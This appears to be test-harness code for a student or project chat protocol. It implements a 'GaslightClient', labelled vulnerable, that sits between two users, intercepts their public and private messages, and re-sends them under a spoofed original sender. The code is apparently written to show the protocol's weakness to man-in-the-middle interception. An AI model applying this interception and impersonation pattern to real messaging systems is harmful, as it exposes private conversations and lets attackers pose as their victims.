import {ChatClient} from "@sp24/common/chatclient/ChatClient.js";
import {TestEntryPoint} from "../testclient/TestEntryPoint.js";
import {webcrypto} from "node:crypto";
import {PSSGenParams} from "@sp24/common/util/crypto.js";
import {TestClientTransport} from "../testclient/TestClientTransport.js";
import child_process from "node:child_process";
import {PublicChatData} from "@sp24/common/messageTypes.js";

export type GaslightEntry = {users: [string, string], middle: string};

// VULNERABLE
export class GaslightClient {
    private _entry: GaslightEntry;
    private _gaslightTable: GaslightEntry[];

    private _testClient: ChatClient;

    private constructor(client: ChatClient, entry: GaslightEntry, table: GaslightEntry[]) {
        this._testClient = client;

        this._entry = entry;
        this._gaslightTable = table;

        client.onPublicChat.createListener(data => {
            if (!this._entry.users.includes(data.senderFingerprint))
                // Discard
                return;

            console.log(`Intercepted public chat from ${data.senderFingerprint}: ${data.message}`);

            // Find the other user
            const otherUser = this._entry.users[0] === data.senderFingerprint ? this._entry.users[1] : this._entry.users[0];

            // Re-send the message
            const publicChatData = new PublicChatData(this._testClient.fingerprint, data.message);
            publicChatData.originalSender = data.senderFingerprint;

            this._testClient["sendSignedData"](publicChatData);
        })
        client.onChat.createListener(data => {
            if (!this._entry.users.includes(data.senderFingerprint))
                // Discard
                return;

            console.log(`Intercepted chat from ${data.senderFingerprint}: ${data.message}`);

            // Find the other user
            const otherUser = this._entry.users[0] === data.senderFingerprint ? this._entry.users[1] : this._entry.users[0];

            // Find the middlemen the other users should reply to
            const otherMiddlemen = this._gaslightTable
                .filter(e => e.users.includes(otherUser) && e.middle !== client.fingerprint)
                .map(e => e.middle);

            this._testClient.sendChat(data.message, this._testClient.getGroupID([otherUser, ...otherMiddlemen]));
        })
    }

    public static async create(entryPoint: TestEntryPoint, users: [string, string], table: GaslightEntry[]) {
        const clientKeys = await webcrypto.subtle.generateKey(PSSGenParams, true, ["sign", "verify"]);
        const testTransport = new TestClientTransport(entryPoint);
        const testClient = await ChatClient.create(testTransport, clientKeys.privateKey, clientKeys.publicKey);

        const entry: GaslightEntry = {users: users, middle: testClient.fingerprint};

        table.push(entry);

        return new GaslightClient(testClient, entry, table);
    }
}